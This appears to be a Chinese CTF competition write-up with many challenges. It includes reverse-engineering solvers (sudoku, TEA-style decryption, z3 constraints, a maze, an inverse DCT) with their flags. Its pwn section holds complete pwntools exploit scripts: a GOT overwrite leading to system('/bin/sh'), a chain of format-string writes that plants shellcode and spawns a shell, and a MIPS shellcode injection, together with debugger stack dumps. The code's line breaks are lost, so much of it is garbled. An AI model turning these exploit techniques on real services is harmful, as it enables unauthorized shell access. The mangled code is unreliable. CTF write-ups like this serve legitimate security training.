unsigned char matrix[] ={0x05, 0x03, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x06,0x00, 0x00, 0x01, 0x09, 0x05, 0x00, 0x00, 0x00, 0x00, 0x09,0x08, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x00, 0x00,0x00, 0x06, 0x00, 0x00, 0x00, 0x03, 0x04, 0x00, 0x00, 0x08,0x00, 0x03, 0x00, 0x00, 0x01, 0x07, 0x00, 0x00, 0x00, 0x02,0x00, 0x00, 0x00, 0x06, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00,0x02, 0x08, 0x00, 0x00, 0x00, 0x00, 0x04, 0x01, 0x09, 0x00,0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x07,0x09};
def print_grid(arr): for i in range(9): for j in range(9): print(arr[i][j], end=" ") print()
def find_empty_location(arr, l): for row in range(9): for col in range(9): if(arr[row][col]==0): l[0]=row l[1]=col return True return False
def used_in_row(arr, row, num): for i in range(9): if(arr[row][i] == num): return True return False
def used_in_col(arr, col, num): for i in range(9): if(arr[i][col] == num): return True return False
def used_in_box(arr, row, col, num): for i in range(3): for j in range(3): if(arr[i+row][j+col] == num): return True return False
def check_location_is_safe(arr, row, col, num): return not used_in_row(arr, row, num) and not used_in_col(arr, col, num) and not used_in_box(arr, row - row%3, col - col%3, num)
def solve_sudoku(arr): l=[0,0] if(not find_empty_location(arr, l)): return True row=l[0] col=l[1] for num in range(1,10): if(check_location_is_safe(arr, row, col, num)): arr[row][col]=num if(solve_sudoku(arr)): return True arr[row][col] = 0 return False

print(grid)grid = [[0x05,0x03,0x00,0x00,0x07,0x00,0x00,0x00,0x00] ,[0x06,0x00,0x00,0x01,0x09,0x05,0x00,0x00,0x00],[0x00,0x09,0x08,0x00,0x00,0x00,0x00,0x06,0x00],[0x08,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x03],[0x04,0x00,0x00,0x08,0x00,0x03,0x00,0x00,0x01],[0x07,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x06],[0x00,0x06,0x00,0x00,0x00,0x00,0x02,0x08,0x00],[0x00,0x00,0x00,0x04,0x01,0x09,0x00,0x00,0x05],[0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x07,0x09]]

solve_sudoku(grid)print_grid(grid)
5 3 4 6 7 8 9 1 2 6 7 2 1 9 5 3 4 8 1 9 8 3 4 2 5 6 7 8 5 9 7 6 1 4 2 3 4 2 6 8 5 3 7 9 1 7 1 3 9 2 4 8 5 6 9 6 1 5 3 7 2 8 4 2 8 7 4 1 9 6 3 5 3 4 5 2 8 6 1 7 9
s = '534678912672195348198342567859761423426853791713924856961537284287419635345286179'x = 0for i in s: x += int(i)    print(x)
echo -n 405|openssl md5MD5(stdin)= bbcbff5c1f1ded46c25d28119a85c6c2
分析代码也就可以知道 把数独答案的所有数字加起来就是flag
无论顺序怎么排 都是 9 个 1-9
x = 0for i in range(1,10): x += i print(x*9)
flag{bbcbff5c1f1ded46c25d28119a85c6c2}
int KEY1 = 9;
int KEY2 = 7;
int key[] = { 0x05,0x02,KEY1,KEY2,0 };
    #include<stdio.h>#include<stdlib.h>#include<strings.h>
int det(int rounds, int v1[2], int key[5]) { int v4; unsigned int v5; unsigned int v6; int i;
 v6 = v1[0]; v5 = v1[1]; v4 = 0xbeefbeef * rounds; for (i = 0; i < rounds; ++i) { v5 -= (v6 + ((v6 >> 5) ^ (16 * v6))) ^ (key[(v4 >> 11) & 3] + v4); v4 -= 0xbeefbeef; v6 -= (v5 + ((v5 >> 5) ^ (16 * v5))) ^ (key[v4 & 3] + v4);
 } v1[0] = v6; v1[1] = v5; return 0;}
unsigned int enflag[]={ 0xecfda301 ,0x61becdf5 ,0xb89e6c7d ,0xce36dc68 ,0x4b6e539e ,0x642eb504 ,0x54f9d33c ,0x6d06e365 ,0xea873d53 ,0xa4618507 ,0xd7b18e30 ,0xc45b4042 ,0,0};
int main(){ int KEY1 = 9; int KEY2 = 7; int key[] = { 0x05,0x02,KEY1,KEY2,0 }; int num_rounds = 36; int v[] = { 0,0,0 }; for (int _ = 0; enflag[_]; _ += 2) { v[0] = enflag[_]; v[1] = enflag[_ + 1]; det(num_rounds, v, key); enflag[_] = v[0]; enflag[_+1] = v[1]; } printf("%sn",enflag); return 0;}
Thisisflag{cdfec405-3f4b-457e-92fe-f6446098ee2e}
import base64, zlib, ctypes
try: mylib = ctypes.cdll.LoadLibrary('./mylib.so')
except: print('file no exit!')else: a = []try: sstr = input("Please enter the 10 digits and ending with '\n': ").split(' ') if len(sstr) == 10: for i in sstr: a.append(int(i))
 mylib.check.argtypes = ( ctypes.POINTER(ctypes.c_int), ctypes.c_int) mylib.check.restype = ctypes.c_char_p scrambled_code_string = mylib.check((ctypes.c_int * len(a))(*a), len(a)) try: decoded_data = base64.b64decode(scrambled_code_string) uncompressed_data = zlib.decompress(decoded_data) exec(__import__('marshal').loads(uncompressed_data)) 
except: print('Incorrect input caused decryption failure!')
except: pass
from z3 import *s = Solver()a1 = [BitVec('a1%d' % i, 32) for i in range(10)]s.add( -27 * a1[7] + -11 * a1[6] + 16 * a1[5] + a1[0] + 2 * a1[1] - a1[2] + 8 * a1[3] - 14 * a1[4] + 26 * a1[8] + 17 * a1[9] == 14462)s.add(-30 * a1[8] + 13 * a1[5] + a1[3] + a1[1] + 2 * a1[0] - 15 * a1[4] - 24 * a1[6] + 16 * a1[7] + 36 * a1[9] == -2591)s.add(16 * a1[6] + -21 * a1[5] + 7 * a1[3] + 3 * a1[1] - a1[0] - a1[2] + 12 * a1[4] - 23 * a1[7] + 25 * a1[8] - 18 * a1[9] == 2517)s.add(-6 * a1[6] + 2 * a1[2] - a1[1] + 2 * a1[5] + 9 * a1[7] + 2 * a1[8] - 5 * a1[9] == 203)s.add(-5 * a1[8] + 6 * a1[7] + 3 * a1[1] - a1[3] - a1[5] + a1[6] + 5 * a1[9] == 3547)s.add(-9 * a1[8] + a1[4] + a1[2] + a1[7] - 5 * a1[9] == -7609)s.add(2 * a1[5] + -a1[3] - a1[4] + a1[8] + 6 * a1[9] == 4884)s.add(a1[6] - a1[7] + 2 * a1[8] == 1618)s.add(a1[4] - a1[6] + 2 * a1[9] == 1096)s.add(a1[8] + a1[4] + a1[3] + a1[2] + a1[1] + a1[0] - a1[5] - a1[6] - a1[7] - a1[9] == 711)s.add(2 * (2 * a1[4] + a1[3]) + 5 * a1[5] == 7151 )assert sat == s.check()ans = s.model()print(ans)for i in range(10): print(ans[a1[i]].as_long(),end=" ") #511 112 821 949 517 637 897 575 648 738
eJyNkz1s20YUgO9RlEKdJUWSZTsGgoJCWwRqq0C0Hf8EQWGgmYMCHdoe0gaU74liJZESSdm0Ek/q
1Mljhw7p1gJFp06dMnbuyLWT905Z2ncn27HToimlu3fvvXvfe++O/IO99hRo7NOIfzUYk0wwjwlA
9tyQ8D2IHJqYx9wc5vCQfbEqCgjPb6CFOSysszntADZ5Sxoy9zUTRYrkuCTNOVB0nqJLFFuagywM
jOjb2W0sEaNODE6MMhbO47ufsskPwNQPK/LGnGx4U1pKfk6ez1hQfd2uq+LnVd0iooVF5Iua5qBW
D9jkF+SiKouPDVETdaxhvWd4IJZp75LUsaIhl8TKwiNLg9ypEf2MK0RuzGHASPsOG7iyzsQqrsry
wDiF6BDrcmlg0qqLVaytM9Irt9g6kze1v6v0XUb5VmRlhxF9mXrVGVSvupPq1U5OjclPRK/p6N8p
uk6ZIXrxir72iv7iklrXsv4mevAbsZcp1ojuYk1XbkS3FXtRNdbP2cp6wa7pDmpvZA+J3dCx31BM
XZ9YumCvXWenV9k7/4f9D8vkz3+1rKiVXP2EtdZmo83JbBLEW/2vtjmimx40t9z2u1zubN57sr81
3PZ4z/Gkc7jTlyPuvP9Oe+/e5smuw90vN5zDbjDabPL22+/12ujI3Sd8Iznem/rjcNDm25Gz29no
7UiH7x3hzDlo9552MuAHcOU7oq+H5Wh8pL6lCk0Je8YkzI0TeAZUn/FImB2n021BVuiF0chNWobI
BdORsNK0o58fWaQIL4uxOxoP8e74OCumqfamHUtxTZUJOER5krP9j4foxmhjkGBkJ320xxEe+uE0
tp2OLX3PT2Lb9Vw/sN1A0jbpB5595Cd9+87j4M59+yXYZ1yROEaR7QfjadI8+4uelnGmMkVF5axq
hz1yZ5TATfr3tZm2KBGp+AzcM9CyMyscRWHgNTOQ566jDOLZw8j3+knTPg6nBDruou2Fie0nH/SG
rmf7sa3kU9VCLwyTceQHiR32dE+XeU8etdZE8dIvCotzy/LxeOgnonzpGfpxkuUjN/Awyw0xyMDP
Cu54TAeQmcqpj0+UwzQM1fmSCMMsr9sUxYvb6GQ5YmV5jcxMTCkHXzjVlEGaQSgqyqL/+qLE8nVd
M7P8QTilgssX0dql7/rKpO42sx6MQjkd4ofqdYoPaTLBpAuvQsOwTBMqUAIDLGhAgeaqYYFlVGHV
MEnj5FM7Knpt07zYUbqm8f/SLsffH2x7Vw==============
footprint = '3qzqns4hj6neeaxc!4a-%nd735_@4l6gnf1gd1v7hdmn1+$-953}81na^21vbnm3!n-#*f-e1d8_n2ty9uipok-n6r1802f7d1n9wez1c-f{0'print(footprint)xx0000 = []footprintlist = footprint.split('n')for i in range(len(footprintlist)): xx0000.append(list(footprintlist[i]))else:
 def xxxx000x0(num): xx000000 = format(num, '010b') return xx000000

 oxooxxxxxoooo = [] xx0000000 = input("Please enter the previous 10 digits again and ending with '\n': ").split(' ') if len(xx0000000) == 10: try: for i in xx0000000: oxooxxxxxoooo.append(int(i))
 
except: print('err input!') exit(-1)
 else: print('err input!') exit(-1) for i in range(len(oxooxxxxxoooo)): oxooxxxxxoooo[i] = list(xxxx000x0(oxooxxxxxoooo[i])) else: print(oxooxxxxxoooo) # 直接把生成的地图输出 xx0000x000 = oxooxxxxxoooo x, o = (0, 0) xx00x00x0xxx00 = [(x, o)] xx00x00x0xxx00input = list(input('input maze path:')) count = 0 while (x, o) != (9, 9): if count < len(xx00x00x0xxx00input): xx0000x0xxx00 = xx00x00x0xxx00input[count] if xx0000x0xxx00 == 'a': if o > 0 and xx0000x000[x][o - 1] == '0': o -= 1 count += 1 xx00x00x0xxx00.append((x, o)) else: print('wrong!') exit(-1) elif xx0000x0xxx00 == 'd': if o < 9 and xx0000x000[x][o + 1] == '0': count += 1 o += 1 xx00x00x0xxx00.append((x, o)) else: print('wrong!') exit(-1) else: if xx0000x0xxx00 == 'w': if x > 0 and xx0000x000[x - 1][o] == '0': count += 1 x -= 1 xx00x00x0xxx00.append((x, o)) else: print('wrong!') exit(-1) else: if xx0000x0xxx00 == 's': if x < 9 and xx0000x000[x + 1][o] == '0': count += 1 x += 1 xx00x00x0xxx00.append((x, o)) else: print('wrong!') exit(-1) else: print('wrong!') exit(-1) else: print('wrong!') exit(-1)
 print('right! you maybe got it,flag is flag{the footprint of the maze path}')
[['0', '1', '1', '1', '1', '1', '1', '1', '1', '1'], ['0', '0', '0', '1', '1', '1', '0', '0', '0', '0'], ['1', '1', '0', '0', '1', '1', '0', '1', '0', '1'], ['1', '1', '1', '0', '1', '1', '0', '1', '0', '1'], ['1', '0', '0', '0', '0', '0', '0', '1', '0', '1'], ['1', '0', '0', '1', '1', '1', '1', '1', '0', '1'], ['1', '1', '1', '0', '0', '0', '0', '0', '0', '1'], ['1', '0', '0', '0', '1', '1', '1', '1', '1', '1'], ['1', '0', '1', '0', '0', '0', '1', '0', '0', '0'], ['1', '0', '1', '1', '1', '0', '0', '0', '1', '0']]
3qzqns4hj6eeaxc!4a-%d735_@4l6gf1gd1v7hdm1+$-953}81a^21vbnm3!-#*f-e1d8_2ty9uipok-6r1802f7d19wez1c-f{0
flag{3eea35d-953744a-6d838d1e-f9802c-f7d10}
import math
def ascii_to_str(l): return "".join(chr(i) for i in l)
def idct_ii(y): n = len(y) x = [0] * n for j in range(n): for k in range(n): if k == 0: x[j] += y[k] * math.sqrt(1/n) else: x[j] += y[k] * math.sqrt(2/n) * math.cos(math.pi * k * (j + 0.5) / n) return x
def decrypt(dct_list): ascii_list = idct_ii(dct_list) padded_s = ascii_to_str([int(round(x)) for x in ascii_list]) return padded_s.strip()

with open("enc", "r") as f: enc_data = list(map(float, f.read().split()))flag = decrypt(enc_data)print(flag)
flag{9ab488a7-5b11-1b15-04f2-c230704ecf72}
from pwn import *p = remote('', )p.sendline(b'W'*0x440)p.interactive()
from pwn import *
s = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)itr = lambda :io.interactive()uu32 = lambda data :
u32(data.ljust(4,b'x00'))uu64 = lambda data :
u64(data.ljust(8,b'x00'))ls = lambda data :
log.success(data)
binary = './easy_LzhiFTP'libcelf = '/lib/x86_64-linux-gnu/libc.so.6'
elf = ELF(binary)libc = ELF(libcelf)context.arch = 'amd64'io = remote("",123)#io = process(binary)
system = 0bin_sh = 0poprdi = 0retn = 0libc_base=0
def cuos(func,addr): global system, bin_sh, poprdi, retn,libc_base libc_base = addr - libc.sym[func] log.success('libc_base : '+hex(libc_base)) system = libc_base + libc.sym['system'] bin_sh = libc_base + next(libc.search(b'/bin/shx00')) poprdi = libc_base + rop.find_gadget(['pop rdi','ret'])[0] retn = libc_base + rop.find_gadget(['ret'])[0]
def main(): ru('Username') sl('admin') ru('Password') s('rx00') ru('(yes/No)') s(f'No%{6+0x13}$pn') ru('No') elf_base = int(r(14),16) - 0x01C88 system = elf_base + elf.plt['system'] free = elf_base + elf.got['free'] ls(hex(elf_base)) for _ in range(0x10): ru('IMLZH1-FTP>') s(f'touch {_}.txtn') ru('write Context:') sl(f'/bin/sh;') ru('IMLZH1-FTP>') sl('del') ru(':') s('0') ru('IMLZH1-FTP>') sl(b'touch '+p64(free)) ru(':') sl('hack') gdb.attach(io) pause() ru('>') sl('edit') s('0') s(p64(system))

main()
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){ int v3; // eax
 sub_400C00(a1, a2, a3); qword_602220 = (char *)mmap((void *)0x20000, 0x1000uLL, 7, 34, 0, 0LL);// 用来写shellcode if ( !qword_602220 ) exit(777); while ( 1 ) { while ( 1 ) { v3 = sub_400BA7(); if ( v3 != 2 ) break; shop(); // 通过玩猜md5游戏获取的分值，在这里消费 } if ( v3 == 3 ) exit(1); if ( v3 == 1 ) game(); // 就是猜MD5,实际是伪随机生成的字符串，每一次生成的值可以完全预测 }}
int sub_401104(){ int result; // eax
 puts("1. Purchase props "); puts("2. expansion backpack "); puts("3. Using props "); puts("4. View backpack "); printf("-------> [%d] <-------", qword_6020D0); puts(&byte_401991); printf(">> "); dword_602100 = 0; __isoc99_scanf("%d", &dword_602100); printf("%d", (unsigned int)dword_602100); result = dword_602100; if ( dword_602100 == 2 ) return sub_401396(); if ( dword_602100 > 2 ) { if ( dword_602100 == 3 ) { return sub_401072(); } else if ( dword_602100 == 4 ) { printf(qword_602220); // 存在格式化字符串漏洞 printf("Backpack size [%d]n", (unsigned int)nbytes); printf("Gold coin [%d]", qword_6020D0); return puts(&byte_401991); } } else if ( dword_602100 == 1 ) { return sub_40124D(); // 写入数据 } return result;}
qword_602220 = (char *)mmap((void *)0x20000, 0x1000uLL, 7, 34, 0, 0LL);// 用来写shellcode
from ctypes import *from pwn import *import hashlibimport time
s = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(str(delim), data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(str(delim), data)r = lambda num :io.recv(num)ru = lambda delims, drop=True :io.recvuntil(delims, drop)itr = lambda :io.interactive()uu32 = lambda data :
u32(data.ljust(4,b'x00'))uu64 = lambda data :
u64(data.ljust(8,b'x00'))ls = lambda data :
log.success(data)
binary = './pwn'libc = ''target = ''#target = '39.106.131.193 30209'
context.arch = 'amd64'context.log_level = 'debug'context.terminal = ['tmux','splitw','-h','-l','130']

if binary != '' : io = process(binary); elf = ELF(binary)if libc != '' : libc = ELF(libc); rop = ROP(libc)if ':' in target: tar = target.split(':');io = remote(tar[0],int(tar[1]))if ' ' in target: tar = target.split(' ');io = remote(tar[0],int(tar[1]))
system = 0bin_sh = 0poprdi = 0retn = 0libc_base=0
def cuos(func,addr): global system, bin_sh, poprdi, retn,libc_base libc_base = addr - libc.sym[func] log.success('libc_base : '+hex(libc_base)) system = libc_base + libc.sym['system'] bin_sh = libc_base + next(libc.search(b'/bin/shx00')) poprdi = libc_base + rop.find_gadget(['pop rdi','ret'])[0] retn = libc_base + rop.find_gadget(['ret'])[0]

clibc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
def md5_creck(): end = '' c = list('abcdefghijklmnopqrstuvwxyzA') for i in range(4): end += c[clibc.random() % 26] return end
def Start(): ru('>> ') sl('1') ru('level : ') sl('4')

def level_4(): ru('MD5(????) == ') #return r(32).decode('utf-8') ru('Give me : ') c = list('abcdefghijklmnopqrstuvwxyzA') end = '' for i in range(4): end += c[clibc.random() % 26] sl(end)

    #def add_nbytes():
def EXP(Format): ru('>> ') sl('2') ru('>> ') sl('1') ru('Enter the letter you want to purchasen') sl(Format) ru('>> ') sl('2') ru('>> ') sl('4')

def solves(): Start() for i in range(70): clibc.srand(int(time.time())) x = r(len('MD5(????) == ')) if x == b'Wrong !!! Wro': Start() else: ru('Give me : ') c = list('abcdefghijklmnopqrstuvwxyzA') end = '' for i in range(4): end += c[clibc.random() % 26] sl(end) #else: # Start() #s = md5_creck() #print(hashlib.md5(s.encode()).hexdigest()) #sl(s)
 ru('Give me : ') sl('hack')

 ru('>> ') sl('2') ru('>> ') sl('2') ru('What size do you need : ') sl('500')
 # 17:
00b8│ 0x7ffea94b1338 —▸ 0x7ffea94b13a8 —▸ 0x7ffea94b3404 ◂— 'SHELL=/bin/bash' # 18:
00c0│ 0x7ffea94b1340 —▸ 0x7fa9a7f48190 ◂— 0x0 # 19:
00c8│ 0x7ffea94b1348 ◂— 0x0 # 1a:
00d0│ 0x7ffea94b1350 ◂— 0x0 # 1b:
00d8│ 0x7ffea94b1358 —▸ 0x400ac0 ◂— xor ebp, ebp # 1c:
00e0│ 0x7ffea94b1360 —▸ 0x7ffea94b1390 ◂— 0x1 # 1d:
00e8│ 0x7ffea94b1368 ◂— 0x0 # 1e:
00f0│ 0x7ffea94b1370 ◂— 0x0 # 1f:
00f8│ 0x7ffea94b1378 —▸ 0x400aea ◂— hlt # 20:
0100│ 0x7ffea94b1380 —▸ 0x7ffea94b1388 ◂— 0x1c # 21:
0108│ 0x7ffea94b1388 ◂— 0x1c # 22:
0110│ r13 0x7ffea94b1390 ◂— 0x1 # 23:
0118│ 0x7ffea94b1398 —▸ 0x7ffea94b33fe ◂— 0x4853006e77702f2e /* './pwn' */ # 24:
0120│ 0x7ffea94b13a0 ◂— 0x0 # 25:
0128│ 0x7ffea94b13a8 —▸ 0x7ffea94b3404 ◂— 'SHELL=/bin/bash'
 ##gdb.attach(io) pay = f'%{0x20+6}$p' Format = pay EXP(Format) ru('4') #print() stack1 = int(r(14),16) - 48 ls(hex(stack1))
 s1 = stack1 & 0xffff pay = f'%{s1}c%{0x17+6}$hnx00' Format = pay EXP(Format)
 # 17:
00b8│ 0x7ffd7b077e78 —▸ 0x7ffd7b077ee8 —▸ 0x7ffd7b077e98 —▸ 0x400ac0 ◂— xor ebp, ebp # 18:
00c0│ 0x7ffd7b077e80 —▸ 0x7f91fcc6b190 ◂— 0x0 # 19:
00c8│ 0x7ffd7b077e88 ◂— 0x0 # 1a:
00d0│ 0x7ffd7b077e90 ◂— 0x0 # 1b:
00d8│ 0x7ffd7b077e98 —▸ 0x400ac0 ◂— xor ebp, ebp # 1c:
00e0│ 0x7ffd7b077ea0 —▸ 0x7ffd7b077ed0 ◂— 0x1 # 1d:
00e8│ 0x7ffd7b077ea8 ◂— 0x0 # 1e:
00f0│ 0x7ffd7b077eb0 ◂— 0x0 # 1f:
00f8│ 0x7ffd7b077eb8 —▸ 0x400aea ◂— hlt # 20:
0100│ 0x7ffd7b077ec0 —▸ 0x7ffd7b077ec8 ◂— 0x1c # 21:
0108│ 0x7ffd7b077ec8 ◂— 0x1c # 22:
0110│ r13 0x7ffd7b077ed0 ◂— 0x1 # 23:
0118│ 0x7ffd7b077ed8 —▸ 0x7ffd7b0783fe ◂— 0x4853006e77702f2e /* './pwn' */ # 24:
0120│ 0x7ffd7b077ee0 ◂— 0x0 # 25:
0128│ 0x7ffd7b077ee8 —▸ 0x7ffd7b077e98 —▸ 0x400ac0 ◂— xor ebp, ebp

 printf_got = elf.got['exit']
 s1 = printf_got & 0xffff pay = f'%{s1}c%{0x25+6}$hnx00' Format = pay EXP(Format)

 s1 = (stack1 +2 )& 0xffff pay = f'%{s1}c%{0x17+6}$hnx00' Format = pay EXP(Format)

 s1 = (printf_got >> 0x10) & 0xffff pay = f'%{s1}c%{0x25+6}$hnx00' Format = pay EXP(Format)

 #gdb.attach(io,'b *0x04017D6') # 29:
0148│ 0x7fffa642c2a8 —▸ 0x7fffa642c258 —▸ 0x400ac0 ◂— xor ebp, ebp
 #pay = f'%{0x20010-2}c%{0x1b+6}$ln' + 'Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t' pay = f'%{0x20010}c%{0x1b+6}$ln' #pay = f'%{0x1b+6}$s' print(len(pay)) Format = pay EXP(Format)
 #s1 = printf_got & 0xffff #pay = f'%{s1}c%{0x25+6}$hnx00' #Format = pay #EXP(Format)

 s1 = (stack1+8)& 0xffff pay = f'%{s1}c%{0x17+6}$hnx00' Format = pay EXP(Format)

 ls(hex(stack1))

 # 1b:
00d8│ 0x7fffae2ad678 —▸ 0x602038 (exit@got.plt) —▸ 0x20010 ◂— 0 # 1c:
00e0│ 0x7fffae2ad680 —▸ 0x7fffae2ad6b0 —▸ 0x20010 ◂— 0 # 1d:
00e8│ 0x7fffae2ad688 ◂— 0x0 # 1e:
00f0│ 0x7fffae2ad690 ◂— 0x0 # 1f:
00f8│ 0x7fffae2ad698 —▸ 0x400aea ◂— hlt # 20:
0100│ 0x7fffae2ad6a0 —▸ 0x7fffae2ad6a8 ◂— 0x1c # 21:
0108│ 0x7fffae2ad6a8 ◂— 0x1c # 22:
0110│ r13 0x7fffae2ad6b0 —▸ 0x20010 ◂— 0 # 23:
0118│ 0x7fffae2ad6b8 —▸ 0x7fffae2af3fe ◂— 0x4853006e77702f2e /* './pwn' */ # 24:
0120│ 0x7fffae2ad6c0 ◂— 0x0 # 25:
0128│ 0x7fffae2ad6c8 —▸ 0x7fffae2ad680 —▸ 0x7fffae2ad6b0 —▸ 0x20010 ◂
 payload = """ xor eax,eax xor edi,edi mov esi,0x20000 syscall nop """ x = asm(payload) print(len(x)) print(disasm(x)) for i in range(0,len(x),2):
 s2 = 0x20010 + i pay = f'%{s2}c%{0x1c+6}$ln' EXP(pay)
 s1 = x[i:i+2] s1 = u16(s1.ljust(2,b"x00")) pay = f'%{s1}c%{0x22+6}$ln' print(len(pay)) Format = pay EXP(Format) #gdb.attach(io,'b *0x00401204')
 ru('>> ') #gdb.attach(io,'b *0x04017D6') sl('3') #io.interactive() payload = b'x90'*0x20 + asm(shellcraft.sh()) sl(payload)

if 'io' in dir(): solves() io.interactive()
io = process(["qemu-mipsel","-g","1234", "-L",".","pwn"])
gdb-multiarch ./pwntarget remote 127.0.0.1:
1234
apt install binutils-mipsisa32r6-linux-gnu-dbgapt install gdbserver-mips32
int get_coin(){ int v0; // $v0 unsigned __int8 *bufpos; // $v0 char v2; // $v0 int i; // [sp+18h] [+18h] FILE *__S; // [sp+1Ch] [+1Ch] char ch; // [sp+20h] [+20h] char coin2[5]; // [sp+24h] [+24h] BYREF
 srand(0x1BF52u); // 每一次都播同一个种子 coin = rand() % 114514 % (Floor_num + 1); // read()每次都是一个固定值 // 我们需要去猜这个 coin， puts("There are some coins.nHow much do you want?"); i = 0; while ( 1 ) { __S = (FILE *)_stdin; if ( *(_DWORD *)(_stdin + 36) ) { if ( __S->__bufpos >= __S->__bufgetc_u ) { v2 = _fgetc_unlocked(__S); } .....
void battle(){ unsigned int v0; // $v0 int i; // [sp+18h] [+18h] int coin; // [sp+1Ch] [+1Ch] int result; // [sp+20h] [+20h] void (*func_ptr)(...); // [sp+24h] [+24h] char buf[80]; // [sp+28h] [+28h] BYREF
 puts("[-]The boss's DEF is 2751n[-]The boss's ATK is 9999"); printf("[-]Your DEF is 0n[-]Your ATK is %dn", attack); puts("[-]Now toss a coin to decide who attack first"); v0 = time(0); srand(v0); coin = rand() % 2; printf("[*]The COIN is %dn", coin); if ( coin == 1 ) { puts("[+]Boss get the first attack!"); puts("[+]0 - 9999 = -9999"); puts("You Died!!"); exit(0); // 运气好就不会退出 } if ( coin ) { printf("Woring!"); exit(0); // 运气好就不会退出 } puts("[+]You get the first attack!"); puts("[+]Attacking..."); result = attack - 2751; if ( attack - 2751 < 0 ) { printf("Your ATK is %dn", attack); exit(0); } puts("You beat the boss!!"); puts("Now open the box which the Princess in."); puts("I have already give you a useful_tools."); puts("Shellcode > "); memset(buf, 0, sizeof(buf)); read(0, buf, 0x10u); // 实际只能写8个字节，这里等会主要用来控制 A1 A2 寄存器 func_ptr = (void (*)(...))buf; for ( i = 0; i < strlen(buf); ++i ) { if ( !check(buf[i]) ) // 检测输入的是不是可见字符，可以x00绕过 { puts("[*]BOX: Forbidden!"); exit(0); } } useful_tools(); func_ptr();}
from pwn import *from ctypes import *
context(arch='mips',endian='little',log_level='debug')
    #io = process(["qemu-mipsel","-L","./","./pwn"])io = process(["qemu-mipsel","-g","1234", "-L",".","pwn"])#io = remote('39.106.48.123', 44194)
c = [0] * 101
Floor_num = 0
for i in range(1,100): io.recvuntil('Go> n') io.sendline('1') io.recvuntil('How much do you want?n') p = 0x7c6ed291 % 114514 % i c[i] = p io.sendline(str(p)) if i == 99: io.recvuntil('Go> n') io.sendline('3') io.recvuntil('> ') io.sendline('3')
print(c)io.recvuntil('Go> n')io.sendline('3')io.recvuntil('> ')io.sendline('2')
io.recvuntil('Go> n')io.sendline('1')io.recvuntil('How much do you want?n')io.sendline('0')
io.recvuntil('Shellcode > n')s = 'x25x00x00x10'
s = asm('''li $a1,0li $a2,0''')print(s)
io.sendline(s)
io.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]